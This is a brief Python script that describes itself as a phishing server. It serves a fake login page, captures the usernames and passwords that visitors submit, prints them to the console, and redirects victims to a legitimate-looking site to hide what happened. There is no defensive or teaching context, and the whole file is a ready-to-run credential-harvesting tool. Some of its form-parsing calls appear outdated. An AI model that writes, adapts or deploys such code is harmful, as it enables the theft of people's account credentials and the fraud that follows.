from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi

class PhishingServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        # A simple HTML form to capture username and password
        html_content = '''
        <html>
        <head><title>Login</title></head>
        <body>
        <h2>Please login</h2>
        <form method="post" action="/">
          Username: <input type="text" name="username"><br>
          Password: <input type="password" name="password"><br>
          <input type="submit" value="Login">
        </form>
        </body>
        </html>
        '''
        self.wfile.write(html_content.encode('utf-8'))

    def do_POST(self):
        ctype, pdict = cgi.parse_header(self.headers.get('Content-type'))
        if ctype == 'multipart/form-data':
            postvars = cgi.parse_multipart(self.rfile, pdict)
        elif ctype == 'application/x-www-form-urlencoded':
            length = int(self.headers.get('Content-length'))
            postvars = cgi.parse_qs(self.rfile.read(length), keep_blank_values=1)
        else:
            postvars = {}
        
        username = postvars[b'username'][0].decode('utf-8')
        password = postvars[b'password'][0].decode('utf-8')

        print(f"Captured credentials: Username: {username}, Password: {password}")

        # Redirect to a legitimate site after capturing credentials
        self.send_response(301)
        self.send_header('Location', 'https://www.example.com')
        self.end_headers()

def run(server_class=HTTPServer, handler_class=PhishingServer, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting phishing server on port {port}...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
